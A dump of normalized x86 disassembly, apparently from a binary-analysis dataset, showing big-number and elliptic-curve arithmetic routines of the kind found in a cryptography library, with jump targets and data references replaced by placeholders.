mov ecx [ esp + 0x50 ]
push ecx
call sub_1002de70
add esp 0x8
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x3c ]
push 0x1
push edx
call sub_10029cf0
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
mov eax [ esp + 0x50 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
call sub_1004c330
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
push edx
push eax
call sub_10026870
mov eax [ esp + 0x34 ]
push eax
call sub_1001d740
add esp 0xc
push eax
call sub_1004c390
add esp 0x4
mov ecx [ esp + 0x4c ]
push ecx
call sub_1002de00
mov eax [ esp + 0x34 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
mov edx [ esp + 0x4c ]
push edx
push ebp
push eax
call sub_1004c3d0
add esp 0xc
test eax eax
je r-xdata
cmp ebx 0x3a9
jle r-xdata
test esi esi
je r-xdata
push eax
call sub_10029cb0
add esp 0x4
cmp ebx 0x132
jle r-xdata
mov [ esp + 0x48 ] 0x6
jmp r-xdata
push esi
call sub_10029cb0
add esp 0x4
cmp ebx 0x59
jle r-xdata
mov [ esp + 0x48 ] 0x5
jmp r-xdata
mov ecx [ esp + 0x48 ]
mov eax 0x1
shl eax cl
push 0x274
push r--data
mov [ esp + 0x2c ] eax
imul eax edi
shl eax 0x2
mov [ esp + 0x30 ] eax
add eax 0x40
push eax
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x2c ] eax
test eax eax
je r-xdata
xor eax eax
cmp ebx 0x16
setle al
dec eax
and eax 0x2
inc eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x48 ] 0x4
jmp r-xdata
mov edi eax
xor eax eax
mov ecx edi
and ecx 0x3f
sub edi ecx
mov ecx [ esp + 0x28 ]
mov edx ecx
add edi 0x40
shr ecx 0x2
mov [ esp + 0x18 ] edi
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x4c ]
push ecx
push eax
lea ebx [ eax + 0x4 ]
push ebx
call sub_10029810
mov edi [ esp + 0x2c ]
push eax
push edi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push edx
push 0x0
push eax
push ecx
push edi
call sub_1004d480
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x4c ]
push edi
call sub_1002de70
push edi
mov esi eax
call sub_1002de70
add esp 0x8
mov [ esp + 0x14 ] eax
test esi esi
je r-xdata
test eax eax
je r-xdata
mov edi [ esp + 0x40 ]
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x14 ]
push edx
push ebp
push edi
push eax
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
push ebp
push edi
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ecx
push edx
push ebx
push edi
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebp [ esp + 0x24 ]
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push ebp
push 0x1
push edx
push ebx
push eax
call sub_1004d480
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x48 ]
cmp ecx 0x1
jle r-xdata
mov edx [ esp + 0x34 ]
lea eax [ ecx + edx - 0x1 ]
cdq
idiv ecx
mov ebp eax
imul ebp ecx
dec ebp
js r-xdata
mov edi 0x2
cmp ebp edi
jle r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x40 ]
push edx
push eax
push ecx
call sub_1004bfb0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x48 ]
xor ebx ebx
xor edi edi
test eax eax
jle r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ecx
push edx
push esi
push eax
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov [ esp + 0x30 ] 0x1
mov edi [ esp + 0x1c ]
mov eax [ esi + 0x8 ]
cmp edi eax
jg r-xdata
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
push eax
push eax
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
push ebp
push edi
push ecx
push ebx
push esi
call sub_1004d480
add esp 0x14
test eax eax
je r-xdata
push edi
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov edx [ esp + 0x44 ]
push ebp
push edx
call sub_1002a150
add esp 0x8
lea ebx [ eax + ebx * 2 ]
mov eax [ esp + 0x48 ]
inc edi
dec ebp
cmp edi eax
jl r-xdata
inc edi
cmp edi ebp
jl r-xdata
shl edi 0x2
xor eax eax
test edi edi
jbe r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x1c ]
test eax eax
mov [ esi + 0x4 ] eax
jle r-xdata
mov ecx [ esp + 0x18 ]
add ecx ebx
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x10 ]
push edx
push eax
mov eax [ esp + 0x28 ]
push esi
push eax
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax [ esi ]
lea edi [ eax + edi - 0x4 ]
mov edx [ esi ]
mov bl [ ecx ]
mov [ edx + eax ] bl
mov ebx [ esp + 0x24 ]
inc eax
add ecx ebx
cmp eax edi
jb r-xdata
test ebp ebp
jge r-xdata
mov ecx [ esi + 0x4 ]
dec ecx
mov eax ecx
mov [ esi + 0x4 ] ecx
test eax eax
jg r-xdata
mov ecx [ edi ]
sub edi 0x4
test ecx ecx
jne r-xdata
sub_1004d480
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi [ esi + 0x8 ]
jg r-xdata
push edi
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
cmp [ esi + 0x4 ] edi
jge r-xdata
pop edi
pop esi
retn
test eax eax
jne r-xdata
shl edi 0x2
xor eax eax
test edi edi
jbe r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ ecx + eax * 4 ] 0x0
mov ecx [ esi + 0x4 ]
inc ecx
mov eax ecx
mov [ esi + 0x4 ] ecx
cmp eax edi
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x20 ]
add ecx edx
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edx [ esi ]
inc eax
mov dl [ edx + eax - 0x1 ]
mov [ ecx ] dl
add ecx ebp
cmp eax edi
jb r-xdata
pop ebp
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
sub_1004d520
mov eax 0x10
call sub_1001d0d0
push esi
mov esi [ esp + 0x20 ]
push edi
xor edi edi
mov al [ esi + 0x10 ]
mov [ esp + 0x8 ] edi
test al 0x4
mov [ esp + 0x14 ] edi
je r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0x4 ]
cmp eax edi
jle r-xdata
push 0x2ef
push r--data
push 0x42
push 0x75
push 0x3
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
add esp 0x10
retn
push 0x2f8
push r--data
push 0x66
push 0x75
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
add esp 0x10
retn
mov ecx [ ecx ]
mov ecx [ ecx ]
test cl 0x1
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
call sub_10029870
add esp 0x4
cmp eax edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
xor edx edx
div ecx
mov [ esp + 0x20 ] edx
cmp [ esp + 0x20 ] edi
jne r-xdata
mov edx [ esp + 0x1c ]
push 0x1
push edx
call sub_10029cf0
add esp 0x8
pop edi
pop esi
add esp 0x10
retn
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
push ebp
mov edi eax
call sub_1002de70
push ebp
mov esi eax
call sub_1002de70
add esp 0x10
mov ebx eax
test edi edi
mov [ esp + 0x14 ] ebx
je r-xdata
mov eax [ esp + 0x1c ]
push edi
push eax
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
add esp 0x10
retn
mov eax [ esp + 0x38 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
push ebp
call sub_1002de00
mov eax [ esp + 0x20 ]
add esp 0x4
pop ebp
pop ebx
pop edi
pop esi
add esp 0x10
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov eax [ esp + 0x38 ]
test eax eax
je r-xdata
call sub_1004c330
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x30 ]
push ebp
push ecx
push eax
call sub_1004c3d0
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov edi [ esp + 0x28 ]
mov ecx 0x1
lea eax [ edx - 0x2 ]
mov [ esp + 0x34 ] ecx
test eax eax
mov [ esp + 0x18 ] eax
jl r-xdata
cmp edi 0x1
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
push edi
push esi
je r-xdata
mov ebx edi
xor edx edx
imul ebx edi
mov eax ebx
div edi
cmp eax edi
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
push ebp
push ecx
push esi
push edx
call sub_1004bfb0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
push 0x1
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
test ecx ecx
mov edi ebx
jne r-xdata
test ecx ecx
push edi
push esi
je r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
mov edx [ esp + 0x30 ]
push ebp
push edx
push esi
push ebx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push ebp
push eax
add eax 0x4
push eax
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x2c ]
push edx
push eax
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
push esi
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov esi ebx
jmp r-xdata
mov eax [ esp + 0x18 ]
dec eax
mov [ esp + 0x18 ] eax
jns r-xdata
mov ecx [ esp + 0x28 ]
xor edx edx
imul ebx ecx
mov eax ebx
div ecx
cmp eax edi
je r-xdata
mov eax [ esp + 0x30 ]
mov edi [ esp + 0x14 ]
push ebp
push eax
push esi
push edi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push ebp
push eax
add eax 0x4
push eax
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x34 ]
mov edi ebx
mov eax [ esp + 0x34 ]
push edi
test eax eax
push esi
je r-xdata
mov eax esi
mov esi edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x34 ] 0x0
jmp r-xdata
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
mov ebx 0x1
mov ecx [ esp + 0x30 ]
mov edi [ esp + 0x14 ]
push ebp
push ecx
push esi
push edi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push ebp
push eax
add eax 0x4
push eax
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax esi
mov esi edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x34 ] 0x0
jmp r-xdata
mov ebx [ esp + 0x28 ]
sub_1004d940
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
retn
lea eax [ esp + 0x4 ]
push 0x0
push eax
call sub_10033c60
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
add esp 0x8
mov [ ecx ] edx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn
sub_1004d990
mov eax 0x54
call sub_1001d0d0
mov ecx [ esp + 0x5c ]
push ebx
push ebp
mov ebp [ esp + 0x60 ]
mov edx [ ecx ]
push esi
mov eax [ ebp ]
xor esi esi
cmp eax edx
push edi
mov [ esp + 0x58 ] esi
mov [ esp + 0x54 ] esi
mov [ esp + 0x44 ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x40 ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x5c ] esi
je r-xdata
mov edx [ esp + 0x70 ]
mov ebx [ esp + 0x74 ]
cmp edx esi
jne r-xdata
push 0x174
jmp r-xdata
xor ecx ecx
cmp ebx esi
jbe r-xdata
cmp ebx esi
jne r-xdata
push r--data
push 0x65
push 0xbb
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
mov edi [ esp + 0x80 ]
cmp edi esi
jne r-xdata
mov edx [ esp + 0x78 ]
push ecx
push ebp
call sub_1002d410
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
cmp [ esp + 0x70 ] esi
je r-xdata
call sub_1002dc50
mov edi eax
cmp eax esi
mov [ esp + 0x58 ] eax
mov [ esp + 0x80 ] edi
je r-xdata
push 0x181
inc ecx
add edx 0x4
cmp ecx ebx
jb r-xdata
mov eax [ esp + 0x24 ]
push 0x1ba
push r--data
lea edi [ eax + ebx ]
mov [ esp + 0x24 ] edi
lea esi [ edi * 4 ]
push esi
call sub_1001d4c0
push 0x1bb
mov ebp eax
push r--data
push esi
mov [ esp + 0x48 ] ebp
call sub_1001d4c0
push 0x1bc
lea ecx [ edi * 4 + 0x4 ]
push r--data
push ecx
mov [ esp + 0x44 ] eax
call sub_1001d4c0
push 0x1bd
mov edi eax
push r--data
push esi
mov [ esp + 0x64 ] edi
call sub_1001d4c0
xor edx edx
add esp 0x30
cmp ebp edx
mov [ esp + 0x18 ] eax
je r-xdata
push ebp
call sub_1002cb10
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x54 ] esi
jne r-xdata
mov eax [ esp + 0x5c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
mov edi [ edx ]
cmp eax [ edi ]
jne r-xdata
push 0x1c1
cmp [ esp + 0x20 ] edx
je r-xdata
mov eax [ ebp + 0x44 ]
push sub_1004e450
push sub_1004e3f0
push sub_1004e3d0
push eax
call sub_1002d070
add esp 0x10
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
push 0x192
push r--data
push 0x71
jmp r-xdata
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1002dcb0
add esp 0x4
cmp edi edx
je r-xdata
mov eax 0x1
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x24 ] eax
mov [ esp + 0x48 ] eax
mov ecx eax
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
push 0xbb
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_1002d200
add esp 0x4
cmp [ esp + 0x18 ] edx
je r-xdata
mov edx ecx
push edi
mov eax [ edx + 0x10 ]
mov ecx [ eax ]
push ecx
push esi
push ebp
call sub_1002da40
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x48 ]
mov [ edi ] edx
mov [ esp + 0x3c ] edx
mov [ esp + 0x10 ] edx
lea eax [ ecx + ebx ]
cmp eax edx
mov [ esp + 0x2c ] eax
jbe r-xdata
mov esi [ esp + 0x14 ]
mov edx [ esp + 0x70 ]
push edx
mov edi [ esi + 0x4 ]
mov [ esp + 0x3c ] edi
call sub_10029870
xor edx edx
add esp 0x4
div edi
mov ecx eax
mov eax [ esi + 0x8 ]
inc ecx
cmp ecx eax
mov [ esp + 0x24 ] ecx
jbe r-xdata
mov edi [ esp + 0x34 ]
test edi edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax [ esp + 0x7c ]
sub edi ebp
sub eax ebp
mov esi ebp
mov [ esp + 0x7c ] eax
mov eax [ esp + 0x20 ]
sub eax ebp
mov [ esp + 0x60 ] eax
mov ecx [ esi + 0xc ]
mov edx 0x1
dec ecx
shl edx cl
mov ecx [ esi + 0x14 ]
imul eax edx
cmp ecx eax
mov [ esp + 0x50 ] edx
je r-xdata
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x4c ]
test edi edi
je r-xdata
mov eax [ edi ]
mov esi edi
test eax eax
je r-xdata
mov esi [ esp + 0x3c ]
push 0x24e
push r--data
lea eax [ esi * 4 + 0x4 ]
push eax
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x4c ] eax
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x70 ]
push ecx
mov edx [ esp + 0x7c ]
mov eax [ edx + esi ]
push eax
jmp r-xdata
push 0x1ab
push r--data
push 0x44
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov esi edi
test eax eax
je r-xdata
push edi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ eax + esi * 4 ]
mov esi eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x70 ] ecx
test eax eax
mov [ ecx ] 0x0
mov [ esp + 0x10 ] 0x0
jbe r-xdata
push 0x251
jmp r-xdata
test ecx ecx
mov [ esp + 0x7c ] 0x0
je r-xdata
cmp ecx 0x1
je r-xdata
cmp eax 0x320
jb r-xdata
mov eax 0x6
jmp r-xdata
call sub_10029870
add esp 0x4
cmp eax 0x7d0
jb r-xdata
push eax
call sub_1001d740
add esp 0x4
push edi
call sub_1001d740
add esp 0x4
push eax
call sub_1002d230
mov eax [ esi + 0x4 ]
add esi 0x4
add esp 0x4
test eax eax
jne r-xdata
cmp esi ecx
je r-xdata
mov edi [ esp + 0x30 ]
mov ebp [ esp + 0x18 ]
sub ebp edi
push r--data
push 0x41
mov eax [ eax + 0xc ]
mov edx [ esp + 0x70 ]
lea ecx [ esp + 0x7c ]
mov [ ebp + ebx * 4 ] eax
push ecx
push eax
push edx
call sub_1004e4d0
mov ecx eax
add esp 0xc
test ecx ecx
mov [ esp + 0x70 ] ecx
je r-xdata
push 0x1ed
push r--data
push 0x44
jmp r-xdata
push 0x1e1
push r--data
push 0x44
jmp r-xdata
cmp eax 0x12c
jb r-xdata
mov eax 0x5
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov edx 0x1
shl edx cl
mov ecx [ esp + 0x3c ]
mov [ esi ] eax
mov [ edi + esi + 0x4 ] 0x0
add ecx edx
cmp ebp ebx
mov [ esp + 0x3c ] ecx
jae r-xdata
mov eax [ esp + 0x68 ]
push eax
call sub_1002d150
add esp 0x4
mov [ esp + 0x44 ] eax
test eax eax
je r-xdata
push 0x264
push r--data
push 0x44
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
inc eax
add edi 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x68 ]
push eax
call sub_1002d150
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
mov esi [ esp + 0x7c ]
mov eax [ esp + 0x28 ]
cmp esi eax
ja r-xdata
cmp eax 0x46
jb r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ esp + 0x70 ]
mov eax [ esp + 0x7c ]
mov eax [ eax + esi ]
jmp r-xdata
mov eax [ esp + 0x2c ]
xor ebp ebp
test eax eax
jbe r-xdata
mov [ edi + ebp ] esi
mov ecx [ edi ]
xor ebx ebx
dec ecx
mov edx 0x1
shl edx cl
test edx edx
jbe r-xdata
mov ecx [ esp + 0x70 ]
mov ecx [ edi ]
add esi 0x4
inc ebx
dec ecx
mov edx 0x1
shl edx cl
cmp ebx edx
jb r-xdata
mov eax [ esp + 0x24 ]
mov edi [ esp + 0x38 ]
imul eax edi
cmp esi eax
jae r-xdata
lea eax [ ebx + 0x1 ]
mov [ edi + ebx * 4 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov [ edi + eax * 4 ] 0x0
mov eax [ esp + 0x20 ]
mov [ eax + ebx * 4 ] esi
mov eax [ esp + 0x18 ]
mov edx [ ecx + 0x10 ]
mov [ eax + ebx * 4 ] edx
jmp r-xdata
cmp eax 0x14
sbb eax eax
add eax 0x2
mov eax 0x3
jmp r-xdata
mov ebp [ ebp ]
mov eax [ esp + 0x28 ]
cmp ebp eax
jbe r-xdata
mov ecx [ esp + 0x60 ]
mov edx [ esi ]
lea ebp [ ecx + esi ]
push ebp
push edx
push eax
call sub_1004e4d0
add esp 0xc
mov [ edi + esi ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x80 ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x3c ]
push eax
mov eax [ esp + 0x6c ]
push ecx
push edx
push eax
call sub_1002db10
add esp 0x10
test eax eax
je r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x78 ]
mov ebx [ esp + 0x30 ]
sub edi esi
mov [ esp + 0x70 ] edi
sub ebx esi
mov eax [ esp + 0x14 ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x10 ] ebx
mov ebp [ eax + 0x10 ]
mov eax [ esp + 0x1c ]
cmp ebx eax
jae r-xdata
lea eax [ esi + edi - 0x1 ]
xor edx edx
div edi
mov edx [ esp + 0x14 ]
cmp eax [ edx + 0x8 ]
jbe r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
inc eax
add esi 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
jb r-xdata
mov [ esp + 0x28 ] ebp
mov ecx [ esp + 0x28 ]
mov [ esp + 0x70 ] 0x1
lea eax [ ecx - 0x1 ]
test eax eax
mov [ esp + 0x78 ] eax
jl r-xdata
mov edx [ esi ]
mov ecx [ esp + 0x54 ]
push ecx
mov eax [ edx ]
push eax
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov ecx [ edi + esi ]
push ecx
mov eax [ edx ]
push eax
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
push ecx
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x34 ]
sub eax ecx
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x18 ]
sub eax ecx
lea ebx [ ecx + ebx * 4 ]
mov [ esp + 0x24 ] eax
jmp r-xdata
add eax ebx
mov [ esp + 0x1c ] eax
push 0x215
push r--data
push 0x44
jmp r-xdata
mov ebp [ esp + 0x10 ]
cmp ebp ebx
jae r-xdata
mov edi [ esp + 0x34 ]
mov ebp [ esp + 0x30 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x6c ]
mov ecx [ esp + 0x68 ]
push eax
push ecx
call sub_1002d410
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x70 ]
test eax eax
jne r-xdata
cmp [ ebx + esi ] 0x1
jbe r-xdata
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x10 ]
cmp ecx eax
jae r-xdata
mov [ esp + 0x5c ] 0x1
jmp r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x0
test eax eax
jbe r-xdata
mov edx [ esp + 0x80 ]
mov eax [ esp + 0x6c ]
push edx
push eax
push eax
mov eax [ esp + 0x74 ]
push eax
call sub_1002d8b0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
inc ebp
add esi 0x4
cmp ebp eax
jb r-xdata
mov edx [ esi ]
mov ecx [ esp + 0x80 ]
push ecx
mov ecx [ esp + 0x48 ]
mov eax [ edx ]
mov edx [ esp + 0x6c ]
push eax
push ecx
push edx
call sub_1002d8b0
add esp 0x10
test eax eax
je r-xdata
mov [ ebx ] esi
mov eax [ esp + 0x38 ]
cmp esi eax
mov [ ebx ] eax
jb r-xdata
mov eax [ esp + 0x78 ]
dec eax
mov [ esp + 0x78 ] eax
jns r-xdata
mov eax [ esp + 0x34 ]
mov ebx [ esp + 0x20 ]
mov edi [ esp + 0x18 ]
mov ebp eax
sub ebx eax
sub ebp edi
cmp ebp [ esp + 0x74 ]
jae r-xdata
mov ecx [ ebx + esi ]
mov edi 0x1
dec ecx
mov eax edi
shl eax cl
cmp eax edi
jbe r-xdata
push 0x234
push r--data
push 0x41
push 0xbb
push 0x10
call sub_1001de60
mov ecx [ esp + 0x84 ]
push ecx
call sub_1001d740
add esp 0x18
jmp r-xdata
mov ecx [ ebx ]
mov edx [ esp + 0x48 ]
mov edi eax
mov eax ecx
mov esi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx ]
mov ecx [ esp + 0x28 ]
cmp eax ecx
jbe r-xdata
push 0x226
push r--data
push 0x44
jmp r-xdata
sub esi eax
mov [ esp + 0x7c ] esi
jmp r-xdata
mov eax [ esp + 0x70 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
inc eax
add edi 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ eax ]
mov eax ecx
movsx esi [ eax + edx ]
test esi esi
je r-xdata
mov edi [ esp + 0x70 ]
mov ecx [ esi ]
mov edx [ esp + 0x80 ]
push edx
mov edx [ ecx + edi * 4 - 0x4 ]
lea eax [ ecx + edi * 4 ]
mov ecx [ esp + 0x48 ]
mov eax [ eax ]
push ecx
mov ecx [ esp + 0x70 ]
push edx
push eax
push ecx
call sub_1002d830
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov [ esp + 0x28 ] eax
mov esi [ esp + 0x60 ]
push 0x231
push r--data
mov [ esi + ebx + 0x4 ] 0x0
mov edx [ ebx ]
push edx
call sub_1001d4c0
add esp 0xc
mov [ esi + ebx ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x78 ]
lea eax [ edi + ebp ]
cmp [ eax + ebx ] ecx
jbe r-xdata
xor eax eax
test esi esi
setl al
test eax eax
je r-xdata
mov ecx [ ebx + esi ]
inc edi
dec ecx
mov edx 0x1
shl edx cl
cmp edi edx
jb r-xdata
push 0x23e
push r--data
push 0x44
push 0xbb
push 0x10
call sub_1001de60
mov edx [ esp + 0x84 ]
push edx
call sub_1001d740
add esp 0x18
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x50 ]
mov edi [ esp + 0x38 ]
mov [ ecx + ebx ] ebp
mov ecx [ esp + 0x1c ]
lea ebp [ ebp + eax * 4 ]
mov eax [ esp + 0x10 ]
add edx edi
inc eax
add ebx 0x4
cmp eax ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x10 ] eax
jb r-xdata
mov [ esp + 0x5c ] 0x1
jmp r-xdata
mov edx [ esp + 0x80 ]
mov eax [ esp + 0x6c ]
mov ecx [ esp + 0x68 ]
push edx
push eax
push ecx
call sub_1002d920
add esp 0xc
test eax eax
je r-xdata
cmp eax [ esp + 0x40 ]
je r-xdata
neg esi
mov esi [ esp + 0x7c ]
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x70 ]
